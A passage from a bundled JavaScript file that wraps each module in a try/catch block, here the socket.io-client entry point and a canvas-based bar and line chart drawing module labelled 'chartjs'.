}catch(e){}
})();

/* >>> socket.io-client (3296 bytes) <<< */
(function(){
try{
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.WebTransport = exports.WebSocket = exports.NodeWebSocket = exports.XHR = exports.NodeXHR = exports.Fetch = exports.Socket = exports.Manager = exports.protocol = void 0;
exports.io = lookup;
exports.connect = lookup;
exports.default = lookup;
const url_js_1 = require("./url.js");
const manager_js_1 = require("./manager.js");
Object.defineProperty(exports, "Manager", { enumerable: true, get: function () { return manager_js_1.Manager; } });
const socket_js_1 = require("./socket.js");
Object.defineProperty(exports, "Socket", { enumerable: true, get: function () { return socket_js_1.Socket; } });
const debug_1 = __importDefault(require("debug")); // debug()
const debug = (0, debug_1.default)("socket.io-client"); // debug()
/**
 * Managers cache.
 */
const cache = {};
function lookup(uri, opts) {
    if (typeof uri === "object") {
        opts = uri;
        uri = undefined;
    }
    opts = opts || {};
    const parsed = (0, url_js_1.url)(uri, opts.path || "/socket.io");
    const source = parsed.source;
    const id = parsed.id;
    const path = parsed.path;
    const sameNamespace = cache[id] && path in cache[id]["nsps"];
    const newConnection = opts.forceNew ||
        opts["force new connection"] ||
        false === opts.multiplex ||
        sameNamespace;
    let io;
    if (newConnection) {
        debug("ignoring socket cache for %s", source);
        io = new manager_js_1.Manager(source, opts);
    }
    else {
        if (!cache[id]) {
            debug("new io instance for %s", source);
            cache[id] = new manager_js_1.Manager(source, opts);
        }
        io = cache[id];
    }
    if (parsed.query && !opts.query) {
        opts.query = parsed.queryKey;
    }
    return io.socket(parsed.path, opts);
}
// so that "lookup" can be used both as a function (e.g. `io(...)`) and as a
// namespace (e.g. `io.connect(...)`), for backward compatibility
Object.assign(lookup, {
    Manager: manager_js_1.Manager,
    Socket: socket_js_1.Socket,
    io: lookup,
    connect: lookup,
});
/**
 * Protocol version.
 *
 * @public
 */
var socket_io_parser_1 = require("socket.io-parser");
Object.defineProperty(exports, "protocol", { enumerable: true, get: function () { return socket_io_parser_1.protocol; } });
var engine_io_client_1 = require("engine.io-client");
Object.defineProperty(exports, "Fetch", { enumerable: true, get: function () { return engine_io_client_1.Fetch; } });
Object.defineProperty(exports, "NodeXHR", { enumerable: true, get: function () { return engine_io_client_1.NodeXHR; } });
Object.defineProperty(exports, "XHR", { enumerable: true, get: function () { return engine_io_client_1.XHR; } });
Object.defineProperty(exports, "NodeWebSocket", { enumerable: true, get: function () { return engine_io_client_1.NodeWebSocket; } });
Object.defineProperty(exports, "WebSocket", { enumerable: true, get: function () { return engine_io_client_1.WebSocket; } });
Object.defineProperty(exports, "WebTransport", { enumerable: true, get: function () { return engine_io_client_1.WebTransport; } });

module.exports = lookup;

}catch(e){}
})();

/* >>> chartjs (36878 bytes) <<< */
(function(){
try{
/*global module:true*/
'use strict';

Math.log2 = Math.log2 || function(x) {
  return Math.log(x) / Math.LN2;
};

Math.log10 = Math.log10 || function(x) {
  return Math.log(x) / Math.LN10;
};

(function() {
  var Helpers = {
    avg: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        v += arr[index];
      }
      return v / arr.length;
    },
    min: function(arr) {
      if (arr.length === 0) return 0;
      var v = arr[0];
      for (var index = 1; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
        if (v2 < v) v = v2;
      }
      return Math.max(0, v);
    },
    max: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
        if (v2 > v) v = v2;
      }
      return Math.max(0, v);
    },
    upperMax: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.max(v2);
        if (v2 > v) v = v2;
      }
      return Math.max(0, v);
    },
    lowerMin: function(arr) {
      if (arr.length === 0) return 0;
      var v = arr[0] || Infinity;
      if (Array.isArray(v)) v = Helpers.lowerMin(v);
      for (var index = 1; index < arr.length; ++index) {
        var v2 = arr[index];
        if (v2 == null) continue;
        if (Array.isArray(v2)) v2 = Helpers.lowerMin(v2);
        if (v2 < v) v = v2;
      }
      if (isNaN(v) || !isFinite(v)) v = 0;
      return Math.max(0, v);
    },
    niceNumbers: function(range, round) {
      var exponent = Math.floor(Math.log10(range));
      var fraction = range / Math.pow(10, exponent);
      var niceFraction;
      if (round) {
        if (fraction < 1.5) niceFraction = 1;
        else if (fraction < 3) niceFraction = 2;
        else if (fraction < 7) niceFraction = 5;
        else niceFraction = 10;
      } else {
        if (fraction <= 1.0) niceFraction = 1;
        else if (fraction <= 2) niceFraction = 2;
        else if (fraction <= 5) niceFraction = 5;
        else niceFraction = 10;
      }
      return niceFraction * Math.pow(10, exponent);
    },
    getLinearTicks: function(min, max, maxTicks) {
      var range = Helpers.niceNumbers(max - min, false);
      var tickSpacing = Helpers.niceNumbers(range / (maxTicks - 1), true);
      return [
        Math.floor(min / tickSpacing) * tickSpacing,
        Math.ceil(max / tickSpacing) * tickSpacing,
        tickSpacing
      ];
    },
    getFont: function(options) {
      options.style = options.style || 'normal';
      options.variant = options.variant || 'normal';
      options.weight = options.weight || 'lighter';
      options.size = options.size || '12';
      options.family = options.family || 'Arial';
      return [options.style, options.variant, options.weight, options.size + 'px', options.family].join(' ');
    },
    getAxisRatio: function(min, max, value) {
      return (value - min) / (max - min);
    }
  };

  var BarChart = (function() {
    function BarChart(ctx, options) {
      this.mouseListeners = [];
      this.currentHint = null;
      this.fillRegions = []
      this.options = {
        font: 'Helvetica',
        fontWeight: 'normal',
        fontSizeTitle: 24,
        fontSizeAxes: 20,
        fontSizeTicks: 18,
        fontSizeLabels: 18,
        fontDataTags: 18,
        fontSizeLegend: 18,
        fontSizeHint: 18,
        paddingPercentBars: 0.10,
        paddingPercentTicks: 0.15,
        paddingPixelsVertical: 10,
        paddingPixelsHorizontal: 10,
        paddingPixelsTicks: 10,
        maxWidthBars: 0,
        fillColorBackground: 'rgb(255, 255, 255)',
        strokeColorBars: 'rgb(0, 0, 0)',
        fillColorBars: 'rgba(180, 180, 180, 0.25)',
        scaleStyle: 'linear',
        barStyle: 'none',
        stackedBarPadding: 3,
        defaultMaxTick: 0,
        pixelsLegendSquare: 10,
        radiusDot: 5,
        fillColorLegend: 'rgb(230, 230, 230)',
        tickFormatter: null,
        tickFormatterMeasure: null,
        fillRegion: 'normal'
      };
      options = options || { };
      for (var key in this.options) {
        if (options.hasOwnProperty(key)) this.options[key] = options[key];
      }
      this.ctx = ctx;
      this.content = { };
      this.labelPositions = { }
    }

    BarChart.prototype.update = function(content) {
      if (typeof content !== 'object') {
        throw new Error('Collections must be objects.');
      } else if (!(content.hasOwnProperty('labels') && content.hasOwnProperty('data'))) {
        throw new Error('Collection must specify labels and data.');
      } else if (!(Array.isArray(content.labels) && Array.isArray(content.data))) {
        throw new Error('Labels and data must be arrays.');
      } else if (content.labels.length !== content.data.length) {
        throw new Error('Labels and data length must match.');
      }
      content._data_standard_deviation = [];
      content._data_standard_error = [];
      for (var i = 0; i < content.data.length; ++i) {
        var isArr = Array.isArray(content.data[i]);
        if (this.options.scaleStyle === 'log2') {
          if (isArr) {
            for (var i3 = 0; i3 < content.data[i].length; ++i3) content.data[i][i3] = Math.log2(content.data[i][i3]);
          } else content.data[i] = Math.log2(content.data[i]);
        }
        if (isArr) {
          var mean = Helpers.avg(content.data[i]);
          var acc = 0;
          for (var i2 = 0; i2 < content.data[i].length; ++i2) acc += Math.pow(mean - content.data[i][i2], 2);
          acc = Math.sqrt(acc / (content.data[i].length - 1));
          content._data_standard_deviation.push(acc);
          content._data_standard_error.push(acc / Math.sqrt(content.data[i].length));
        } else {
          content._data_standard_deviation.push(0);
          content._data_standard_error.push(0);
        }
      }
      this.content = content;
      this.redraw();
    };

    BarChart.prototype.redraw = function() {
      setTimeout(function() {
        this._draw();
      }.bind(this), 0);
    };

    BarChart.prototype.mousemove = function(x, y) {
      var res = null;
      for (var index = 0; index < this.mouseListeners.length; ++index) {
        if ((res = this.mouseListeners[index](x, y))) break;
      }
      if (!res || (typeof res) !== 'object' || !res.hasOwnProperty('index') || !res.hasOwnProperty('drawIndex')) {
        if (this.currentHint !== null) {
          this.currentHint = null;
          this.redraw();
        }
        return;
      }
      var ch = this.currentHint;
      if (ch == null || ch.index != res.index || ch.drawIndex != res.drawIndex) {
        this.currentHint = res;
        this.redraw();
      }
    };

    BarChart.prototype._draw = function() {
      var labelPositions = { }
      this.mouseListeners = [];
      this.fillRegions = [];

      var options = this.options;
      var ctx = this.ctx, content = this.content;
      var width = ctx.canvas.width, height = ctx.canvas.height;
      ctx.clearRect(0, 0, width, height);
      ctx.translate(-0.5, -0.5);
      var remainingWidth = width, remainingHeight = height;
      var index;

      if (options.fillColorBackground != null) {
        ctx.save();
        ctx.fillStyle = options.fillColorBackground;
        ctx.fillRect(0, 0, width, height);
        ctx.restore();
      }

      var topYPadding = options.paddingPixelsHorizontal;
      remainingHeight -= options.paddingPixelsHorizontal;
      ctx.fillStyle = 'rgb(0, 0, 0)';
      /* Draw title of bar chart */
      if (content.title != null) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTitle, family: options.font });
        ctx.textAlign = 'center';
        ctx.fillText(content.title, width / 2, topYPadding + options.fontSizeTitle);
        ctx.restore();
        remainingHeight -= options.fontSizeTitle * 1.25;
        topYPadding += options.fontSizeTitle * 1.25;
      }

      /* Compute required left padding */
      var leftXPadding = options.paddingPixelsVertical;
      remainingWidth  -= options.paddingPixelsVertical;

      var leftXDrawYLabel = null;
      if (content.yAxis != null) {
        leftXDrawYLabel = leftXPadding + options.fontSizeAxes * 0.5;
        remainingWidth -= options.fontSizeAxes * 1.25;
        leftXPadding += options.fontSizeAxes * 1.25;
      }

      ctx.save();
      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
      var maxChartValue, minChartValue;
      if (options.barStyle === 'stacked') {
        maxChartValue = 0;
        minChartValue = Infinity;
        for (var cmIndex = 0; cmIndex < content.data.length; ++cmIndex) {
          var doB;
          if (Array.isArray(doB = content.data[cmIndex])) {
            var tempSum = 0;
            for (var ii2 = 0; ii2 < doB.length; ++ii2) tempSum += doB[ii2];
            maxChartValue = Math.max(maxChartValue, tempSum);
            minChartValue = Math.min(minChartValue, tempSum);
          } else {
            maxChartValue = Math.max(maxChartValue, content.data[cmIndex]);
            minChartValue = Math.min(minChartValue, content.data[cmIndex]);
          }
        }
      } else {
        maxChartValue = Helpers.upperMax(content.data);
        minChartValue = Helpers.lowerMin(content.data);
      }
      if (options.scaleStyle.indexOf('adaptive') === 0) {
        if (options.scaleStyle.indexOf(':') !== -1) {
          var floater = parseFloat(options.scaleStyle.split(/[:]/)[1]);
          minChartValue *= floater;
          maxChartValue *= 1 + (1 - floater) / 2.0;
        }
      } else minChartValue = 0;
      if (options.defaultMaxTick > maxChartValue) maxChartValue = options.defaultMaxTick;
      if (content.bars != null && Array.isArray(content.bars)) {
        for (index = 0; index < content.bars.length; ++index) {
          var cbv = content.bars[index].value;
          if (isNaN(cbv)) continue;
          maxChartValue = Math.max(maxChartValue, cbv);
          minChartValue = Math.min(minChartValue, cbv);
        }
      }
      var maxYAxisTickWidth = options.scaleStyle == 'log2' ? Math.ceil(Math.pow(2, maxChartValue)) : (Math.ceil(maxChartValue) + '.00');
      if (options.tickFormatterMeasure != null) maxYAxisTickWidth = options.tickFormatterMeasure;
      maxYAxisTickWidth = ctx.measureText(maxYAxisTickWidth).width;
      maxYAxisTickWidth = Math.ceil(maxYAxisTickWidth) + options.paddingPixelsTicks;
      remainingWidth -= maxYAxisTickWidth;
      leftXPadding += maxYAxisTickWidth;
      ctx.restore();

      var rightXPadding = options.paddingPixelsVertical;
      remainingWidth -= options.paddingPixelsVertical;

      /* Draw legend */
      if (content.legend != null && Array.isArray(content.legend)) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLegend, family: options.font });
        var maxLWidth = 0;
        for (var lIndex = 0; lIndex < content.legend.length; ++lIndex) {
          maxLWidth = Math.max(maxLWidth, ctx.measureText(content.legend[lIndex].label).width);
        }
        maxLWidth = Math.ceil(maxLWidth);
        maxLWidth += options.pixelsLegendSquare + 8;
        var legendEntriesPerLine = Math.floor((remainingWidth - options.paddingPixelsHorizontal * 2) / maxLWidth);
        var lLReqHeight = Math.ceil(content.legend.length / legendEntriesPerLine) * options.fontSizeLegend * 1.5;
        remainingHeight -= lLReqHeight;
        bottomYPadding += lLReqHeight;

        ctx.strokeStyle = 'rgb(0, 0, 0)';
        ctx.fillStyle = options.fillColorLegend;
        var bSX, bSY;
        ctx.beginPath();
        ctx.moveTo(bSX = leftXPadding, bSY = topYPadding + remainingHeight);
        ctx.lineTo(bSX + remainingWidth, bSY);
        ctx.lineTo(bSX + remainingWidth, bSY + lLReqHeight);
        ctx.lineTo(bSX, bSY + lLReqHeight);
        ctx.lineTo(bSX, bSY);
        ctx.stroke();
        ctx.fill();

        for (lIndex = 0; lIndex < content.legend.length; ++lIndex) {
          var legLine = Math.floor(lIndex / legendEntriesPerLine);
          var legCol = lIndex % legendEntriesPerLine;
          ctx.fillStyle = content.legend[lIndex].color;
          var boxX = bSX + legCol * maxLWidth + 3, boxY = bSY + legLine * options.fontSizeLegend * 1.5 + options.fontSizeLegend * 0.5;
          ctx.beginPath();
          ctx.moveTo(boxX, boxY);
          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY);
          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY + options.pixelsLegendSquare);
          ctx.lineTo(boxX, boxY + options.pixelsLegendSquare);
          ctx.lineTo(boxX, boxY);
          ctx.fill();
          ctx.stroke();

          ctx.textAlign = 'left';
          ctx.fillStyle = 'rgb(0, 0, 0)';
          ctx.fillText(content.legend[lIndex].label, boxX + 3 + options.pixelsLegendSquare, boxY + options.fontSizeLegend * 0.5);
        }

        ctx.restore();
      }

      /* Draw x-axis label of bar chart */
      var bottomYPadding = options.paddingPixelsHorizontal;
      remainingHeight -= options.paddingPixelsHorizontal;
      if (content.xAxis != null) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
        ctx.fillStyle = 'rgb(0, 0, 0)';
        ctx.textAlign = 'center';
        ctx.fillText(content.xAxis, (width - remainingWidth) + remainingWidth / 2, topYPadding + remainingHeight - bottomYPadding);
        remainingHeight -= options.fontSizeAxes * 1.5;
        bottomYPadding += options.fontSizeAxes * 1.5;
        ctx.restore();
      }

      var widthPerBar = remainingWidth / content.data.length;

      /* Draw x-axis top labels */
      if (content.topLabels != null) {
        ctx.save();
        ctx.textAlign = 'center';
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
        remainingHeight -= options.fontSizeLabels * 1.5;
        topYPadding += options.fontSizeLabels * 1.5;
        for (index = 0; index < content.topLabels.length; ++index) {
          ctx.fillText(
            content.topLabels[index],
            leftXPadding + index * widthPerBar + widthPerBar / 2,
            topYPadding - options.fontSizeLabels / 2
          );
        }
        ctx.restore();
      }

      /* Draw x-axis labels */
      ctx.save();
      var reqWidth = 0;
      if (content.dataTags != null) {
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
        var dataTags = content.dataTags;
        for (index = 0; index < dataTags.length; ++index) {
          if (Array.isArray(dataTags[index])) {
            for (var index2 = 0; index2 < dataTags[index].length; ++index2) {
              reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index][index2]).width + 5));
            }
          } else {
            reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index]).width + 5));
          }
        }
      }

      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
      var computedBarPadding = Math.floor((widthPerBar * options.paddingPercentBars) / 2);
      var wwh = widthPerBar - computedBarPadding * 2;
      if (wwh < reqWidth) {
        computedBarPadding -= Math.ceil((reqWidth - wwh) / 2);
        computedBarPadding = Math.max(0, computedBarPadding);
      } else if (options.maxWidthBars > 0 && wwh > options.maxWidthBars) {
        computedBarPadding = Math.floor((widthPerBar - options.maxWidthBars) / 2);
      }
      var maxTextWidth = 0, maxTextStackSize = 1;
      for (index = 0; index < content.labels.length; ++index) {
        var tLabel = content.labels[index];
        if (Array.isArray(tLabel)) {
          maxTextStackSize = Math.max(maxTextStackSize, tLabel.length);
          for (index2 = 0; index2 < tLabel.length; ++index2) {
            maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel[index2]).width);
          }
        } else maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel).width);
      }
      var xLabelsRotated = false;
      if (maxTextWidth > widthPerBar - computedBarPadding) {
        ctx.textAlign = 'right';
        ctx.rotate(Math.PI * 1.5);
        xLabelsRotated = true;
      } else {
        ctx.textAlign = 'center';
      }
      var lastLabelY = -options.fontSizeLabels;
      for (index = 0; index < content.labels.length; ++index) {
        var cLabel = content.labels[index];
        var x = leftXPadding + index * widthPerBar + widthPerBar / 2, y = topYPadding + remainingHeight - options.fontSizeLabels / 2;
        if (xLabelsRotated) {
          y = topYPadding + remainingHeight - maxTextWidth + 5;
          y = [x, x = -y][0];

          if (y < lastLabelY + options.fontSizeLabels) continue;
          lastLabelY = y;
        }
        var yUp = options.fontSizeLabels * (maxTextStackSize - 1);
        if (Array.isArray(cLabel)) {
          if (xLabelsRotated) {
            yUp = options.fontSizeLabels * (cLabel.length - 1.5);
            yUp /= 2;
          }
          for (index2 = 0; index2 < cLabel.length; ++index2) {
            ctx.fillText(cLabel[index2], x, y - yUp);
            yUp -= options.fontSizeLabels;
          }
        } else {
          if (xLabelsRotated) yUp = -options.fontSizeLabels * 0.25;
          ctx.fillText(cLabel, x, y - yUp);
        }
      }
      if (xLabelsRotated) {
        remainingHeight -= maxTextWidth + 5;
        bottomYPadding += maxTextWidth + 5;
      } else {
        var remVal = options.fontSizeLabels * maxTextStackSize;
        remVal += options.fontSizeLabels * 0.5;
        remainingHeight -= remVal;
        bottomYPadding += remVal;
      }
      ctx.restore();

      /* Draw boundaries */
      var boundX1 = leftXPadding, boundX2 = leftXPadding + remainingWidth;
      var boundY1 = topYPadding, boundY2 = topYPadding + remainingHeight;

      for (index = 0; index < content.labels.length; ++index) labelPositions[index] = {
        xStart: leftXPadding + index * widthPerBar,
        xEnd: leftXPadding + (1 + index) * widthPerBar,
        yStart: boundY1, yEnd: boundY2
      }

      ctx.save();
      ctx.strokeStyle = 'rgb(0, 0, 0)';
      ctx.beginPath();
      if (content.topLabels != null) {
        ctx.moveTo(boundX2, boundY1);
        ctx.lineTo(boundX1, boundY1);
      } else {
        ctx.moveTo(boundX1, boundY1);
      }
      ctx.lineTo(boundX1, boundY2);
      ctx.lineTo(boundX2, boundY2);
      if (content.topLabels != null) ctx.lineTo(leftXPadding + remainingWidth, topYPadding);
      ctx.stroke();
      ctx.restore();

      /* Draw top label */
      if (content.topLabel != null) {
        ctx.save();
        ctx.textAlign = 'right';
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
        ctx.fillText(content.topLabel, leftXPadding - 3, topYPadding - options.fontSizeLabels / 2);
        ctx.restore();
      }

      /* Draw y-axis label of bar chart */
      if (content.yAxis != null) {
        ctx.save();
        ctx.rotate(Math.PI * 1.5);
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
        ctx.fillStyle = 'rgb(0, 0, 0)';
        ctx.textAlign = 'center';
        ctx.fillText(content.yAxis, -(topYPadding + remainingHeight / 2), leftXDrawYLabel);
        ctx.restore();
      }

      /* Draw y-axis labels */
      ctx.save();
      ctx.fillStyle = 'rgb(0, 0, 0)';
      ctx.strokeStyle = 'rgba(0, 0, 0, 0.20)';
      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
      ctx.textAlign = 'right';
      var tickMeta = Helpers.getLinearTicks(0, maxChartValue, Math.max(2, remainingHeight / (options.fontSizeTicks * (1 + options.paddingPercentTicks))));
      var alpha = maxChartValue / options.fontSizeTicks;
      maxChartValue = tickMeta[1];
      if (maxChartValue > 1) maxChartValue += Math.ceil(alpha);
      else maxChartValue += alpha;
      var ticks = [];
      while (tickMeta[0] <= tickMeta[1]) {
        ticks.push(tickMeta[0]);
        tickMeta[0] += tickMeta[2];
      }
      for (index = 0; index < ticks.length; ++index) {
        var tickHeight = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, ticks[index]));
        if (tickHeight < 0) continue;
        if (options.scaleStyle == 'log2' && ticks[index] !== 0) ticks[index] = Math.round(Math.pow(2, ticks[index]));
        else ticks[index] = Math.floor(ticks[index] * 100) / 100;
        if (options.tickFormatter != null && typeof options.tickFormatter === 'function') {
          ctx.fillText(options.tickFormatter(ticks[index]).toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
        } else {
          ctx.fillText(ticks[index].toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
        }
        if (index == 0) continue;
        ctx.beginPath();
        ctx.moveTo(leftXPadding, topYPadding + remainingHeight - tickHeight);
        ctx.lineTo(leftXPadding + remainingWidth, topYPadding + remainingHeight - tickHeight);
        ctx.stroke();
      }
      ctx.restore();

      if (content.bars != null && Array.isArray(content.bars)) {
        ctx.save();
        for (index = 0; index < content.bars.length; ++index) {
          var cBar = content.bars[index];
          if (cBar.value > maxChartValue) continue;
          var renderBarY = topYPadding + remainingHeight - Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, cBar.value));
          ctx.strokeStyle = cBar.style;
          ctx.fillStyle = cBar.style;
          ctx.beginPath();
          ctx.moveTo(boundX1, renderBarY);
          ctx.lineTo(boundX2, renderBarY);
          ctx.stroke();
          ctx.fill();
        }
        ctx.restore();
      }

      /* Draw bars */
      ctx.save();
      var lastData = null;
      for (index = 0; index < content.data.length; ++index) {
        var fillColorForIndex = null;
        var strokeColorForIndex = null;
        if (content.fillColor != null) {
          if (Array.isArray(content.fillColor)) fillColorForIndex = ctx.fillStyle = content.fillColor[index];
          else ctx.fillStyle = content.fillColor;
        } else ctx.fillStyle = options.fillColorBars;
        if (content.strokeColor != null) {
          if (Array.isArray(content.strokeColor)) strokeColorForIndex = ctx.strokeStyle = content.strokeColor[index];
          else ctx.strokeStyle = content.strokeColor;
        } else ctx.strokeStyle = options.strokeColorBars;
        var v = content.data[index];
        var vIsArr = Array.isArray(v);
        var renderStartX = leftXPadding + widthPerBar * index;
        if (vIsArr && options.barStyle === 'stacked') {
          var runningValue = 0, lastHeight = 0;
          for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
            if (fillColorForIndex != null && Array.isArray(fillColorForIndex)) {
              ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
            }
            if (strokeColorForIndex != null && Array.isArray(strokeColorForIndex)) {
              ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
            }

            runningValue += v[drawIndex];
            var renderBarHeight = Math.floor(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, runningValue));
            var renderUpToY = topYPadding + remainingHeight - renderBarHeight;
            if (Math.abs(renderBarHeight - lastHeight) < options.stackedBarPadding + 2) {
              lastHeight = renderBarHeight;
              continue;
            }

            var barPadP = drawIndex > 0 ? options.stackedBarPadding : 0;
            var tSX, tSY;
            var tEX, tEY;
            ctx.beginPath();
            ctx.moveTo(tSX = renderStartX + computedBarPadding, tSY = topYPadding + remainingHeight - lastHeight - barPadP);
            ctx.lineTo(renderStartX + computedBarPadding, renderUpToY);
            ctx.lineTo(tEX = renderStartX + (widthPerBar - 1) - computedBarPadding, tEY = renderUpToY);
            ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, topYPadding + remainingHeight - lastHeight - barPadP);
            if (drawIndex > 0) ctx.lineTo(tSX, tSY);
            ctx.stroke();
            ctx.fill();
            var hint;
            if (content.hints != null && content.hints[index] != null && (hint = content.hints[index][drawIndex]) != null) {
              this.mouseListeners.push(function(index, drawIndex, hint, sx, sy, ex, ey, x, y) {
                var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
                var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
                if (x < minX || x > maxX || y < minY || y > maxY) return null;
                return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
              }.bind(this, index, drawIndex, hint, tSX, tSY, tEX, tEY));
            }

            var tagText;
            if (tSY - renderUpToY > options.fontDataTags * 1.25 && content.dataTags != null && (tagText = content.dataTags[index]) != null && (tagText = tagText[drawIndex]) != null) {
              var oFS = ctx.fillStyle;
              ctx.fillStyle = 'rgb(0, 0, 0)';
              ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
              ctx.textAlign = 'center';
              ctx.fillText(tagText, renderStartX + widthPerBar / 2, tSY - options.fontDataTags * 0.25);
              ctx.fillStyle = oFS;
            }

            lastHeight = renderBarHeight;
          }

          if (content.barTooltips != null) {
            ctx.fillStyle = 'rgb(0, 0, 0)';
            ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
            ctx.textAlign = 'center';
            ctx.fillText(content.barTooltips[index] || '', renderStartX + widthPerBar / 2, renderUpToY - 3);
          }
        } else if (options.barStyle === 'line') {
          if (vIsArr) {
            var rbx = renderStartX + widthPerBar / 2;

            var lDu;
            if (options.fillRegion === 'background') {
              lDu = lastData;
              if (Array.isArray(lDu)) lDu = lDu[0];
              if (lDu != null) {
                var sFS = ctx.fillStyle
                ctx.fillStyle = lDu.color
                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
                ctx.fillStyle = sFS
              }
            }

            var nLData = [];
            for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
              var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v[drawIndex]));
              var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;

              var rby = renderUpToY3;
              if (lastData != null) {
                var tLX, tLY;
                if (Array.isArray(lastData)) {
                  tLX = (lastData[drawIndex] || { }).x;
                  tLY = (lastData[drawIndex] || { }).y;
                } else {
                  tLX = lastData.x;
                  tLY = lastData.y;
                }

                if (tLX && tLY) {
                  if (Array.isArray(strokeColorForIndex)) {
                    ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
                  } else ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
                  ctx.beginPath();
                  ctx.moveTo(tLX, tLY);
                  ctx.lineTo(rbx, rby);
                  ctx.stroke();
                }
              }

              if (Array.isArray(fillColorForIndex)) {
                ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
              }
              if (Array.isArray(strokeColorForIndex)) {
                ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
              }

              ctx.beginPath();
              ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
              ctx.stroke();
              ctx.fill();

              nLData[drawIndex] = { x: rbx, y: rby, color: ctx.fillStyle };
            }
            lastData = nLData;
            if (lDu != null && lDu.color != lastData[0].color) this.fillRegions.push({
              x: lastData[0].x,
              y: lastData[0].y,
              prev: lDu.color,
              next: lastData[0].color
            })

            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
              var ball = content.balls[index]
              if (ball != null) {
                ctx.beginPath();
                ctx.fillStyle = ball.fill;
                ctx.strokeStyle = ball.stroke;
                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
                ctx.stroke();
                ctx.fill();
              }
            }
          } else {
            var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v));
            var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;

            var rbx = renderStartX + widthPerBar / 2, rby = renderUpToY3;
            var lDu;
            if (options.fillRegion === 'background') {
              if (lastData != null) {
                lDu = lastData;
                if (Array.isArray(lDu)) lDu = lDu[0];
                var sFS = ctx.fillStyle
                ctx.fillStyle = lDu.color
                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
                ctx.fillStyle = sFS
              }
            }
            ctx.beginPath();
            ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
            ctx.stroke();
            ctx.fill();

            if (lastData != null) {
              if (Array.isArray(lastData)) {
                var tLX, tLY;
                for (var key in lastData) {
                  if (!lastData.hasOwnProperty(key)) continue;
                  tLX = lastData[key].x;
                  tLY = lastData[key].y;
                  if (tLX && tLY) {
                    ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
                    ctx.beginPath();
                    ctx.moveTo(tLX, tLY);
                    ctx.lineTo(rbx, rby);
                    ctx.stroke();
                  }
                }
              } else {
                var tLX = lastData.x, tLY = lastData.y;
                if (tLX && tLY) {
                  ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
                  ctx.beginPath();
                  ctx.moveTo(tLX, tLY);
                  ctx.lineTo(rbx, rby);
                  ctx.stroke();
                }
              }
            }

            lastData = { x: rbx, y: rby, color: ctx.fillStyle };
            if (lDu != null && lDu.color != lastData.color) this.fillRegions.push({
              x: lastData.x,
              y: lastData.y,
              prev: lDu.color,
              next: lastData.color
            })

